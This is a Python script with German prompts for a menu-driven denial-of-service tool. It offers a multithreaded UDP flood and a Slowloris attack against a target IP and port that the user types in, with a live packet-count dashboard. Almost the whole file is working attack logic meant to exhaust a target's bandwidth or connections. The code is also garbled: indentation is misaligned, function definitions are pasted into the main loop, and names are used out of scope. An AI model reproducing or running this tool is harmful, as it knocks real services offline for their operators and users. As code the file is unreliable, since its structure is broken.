import os
import random
import socket
import threading
import time
import sys
from udp_flood import udp_flood_attack
from slowloris import slowloris_attack
from dashboard import start_dashboard, stop_dashboard

# Globale Variablen
packet_counter = 0
stop_event = threading.Event()

# Banner
def show_banner(color):
    os.system("clear")
    print(f"{color}")
    print("""
██████╗ ██████╗  
██╔══██╗██╔══██╗
██████╔╝██████╔
██╔═══╝ ██╔═══╝ 
██║     ██║     
╚═╝     ╚═╝      
    """)
    print("\033[0m")

# UDP Flood
def udp_flood_attack(ip, port, packet_size, packet_rate, threads, duration):
    stop_event = threading.Event()
    packet_counter = [0]  # List als mutable Zähler

    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096)
        udp_bytes = random._urandom(packet_size)
        start_time = time.time()

        while not stop_event.is_set():
            try:
                sock.sendto(udp_bytes, (ip, port))
                packet_counter[0] += 1
                elapsed = time.time() - start_time
                if packet_counter[0] / elapsed > packet_rate:
                    time.sleep(0.001)
            except:
                pass

    threads_list = [threading.Thread(target=udp_flood) for _ in range(threads)]
    for t in threads_list:
        t.start()

    time.sleep(duration)
    stop_event.set()
    for t in threads_list:
        t.join()
    print(f"[INFO] UDP Flood beendet. Gesendete Pakete: {packet_counter[0]}")

# Slowloris (TCP Keep-Alive)
def slowloris_attack(ip, port, threads, duration):
    stop_event = threading.Event()
    packet_counter = [0]

    def slowloris():
        sockets = []
        for _ in range(200):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((ip, port))
                sock.send(b"GET / HTTP/1.1\r\n")
                sockets.append(sock)
            except:
                pass

        while not stop_event.is_set():
            for sock in sockets:
                try:
                    sock.send(b"X-a: Keep-alive\r\n")
                    packet_counter[0] += 1
                except:
                    sockets.remove(sock)

    threads_list = [threading.Thread(target=slowloris) for _ in range(threads)]
    for t in threads_list:
        t.start()

    time.sleep(duration)
    stop_event.set()
    for t in threads_list:
        t.join()
    print(f"[INFO] Slowloris beendet. Gesendete Pakete: {packet_counter[0]}")

# Menü zur Farbauswahl
def choose_color():
    print("1 - Rot")
    print("2 - Grün")
    print("3 - Blau")
    print("4 - Standard")
    choice = input("Wähle eine Farbe: ")
    return {
        "1": "\033[91m",
        "2": "\033[92m",
        "3": "\033[94m",
        "4": "\033[0m",
    }.get(choice, "\033[0m")

# Live-Dashboard
def dashboard():
    global packet_counter
    start_time = time.time()
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        rate = packet_counter / elapsed if elapsed > 0 else 0
        print(f"\r[INFO] Gesendete Pakete: {packet_counter} | Paketrate: {rate:.2f}/s", end="")
        time.sleep(1)

# Hauptprogramm
if __name__ == "__main__":
    color = choose_color()
    show_banner(color)

    while True:
        print("1 - UDP Flood")
        print("2 - Slowloris Attack")
        print("3 - Beenden")
        choice = input(" [ Wähle eine Option ] : ")

        if choice == "3":
            print("[INFO] Programm beendet.")
            sys.exit()

        elif choice == "1":  # UDP Flood
            from udp_flood import udp_flood_attack

            ip = input("Ziel-IP-Adresse: ")
            port = int(input("Ziel-Port: "))
            duration = int(input("Dauer des Angriffs (Sekunden): "))
            threads = int(input("Anzahl der Threads: "))
            packet_size = max(1, min(65507, int(input("Paketgröße (Bytes, 1-65507): "))))
            packet_rate = max(1, int(input("Maximale Pakete pro Sekunde (min. 1): ")))

            stop_event.clear()

          elif choice == "2":  # Slowloris
            from slowloris import slowloris_attack

            ip = input("Ziel-IP-Adresse: ")
            port = int(input("Ziel-Port: "))
            duration = int(input("Dauer des Angriffs (Sekunden): "))
            threads = int(input("Anzahl der Threads: "))

            slowloris_attack(ip, port, threads, duration)


            stop_event.clear()

            # Threads starten
            attack_threads = [
                threading.Thread(target=udp_flood, args=(ip, port, packet_size, packet_rate))
                for _ in range(threads)
            ]
            for thread in attack_threads:
                thread.start()

            # Dashboard starten
            dashboard_thread = threading.Thread(target=dashboard)
            dashboard_thread.start()

            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
            stop_event.set()

            # Threads starten
            attack_threads = [
                threading.Thread(target=slowloris, args=(ip, port))
                for _ in range(threads)
            ]
            for thread in attack_threads:
                thread.start()

            # Dashboard starten
            def start_dashboard(packet_counter, stop_event):
    def dashboard():
        start_time = time.time()
        while not stop_event.is_set():
            elapsed = time.time() - start_time
            rate = packet_counter[0] / elapsed if elapsed > 0 else 0
            print(f"\r[INFO] Gesendete Pakete: {packet_counter[0]} | Paketrate: {rate:.2f}/s", end="")
            time.sleep(1)

    dashboard_thread = threading.Thread(target=dashboard)
    dashboard_thread.start()
    return dashboard_thread

def stop_dashboard(dashboard_thread):
    dashboard_thread.join()

            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
            stop_event.set()
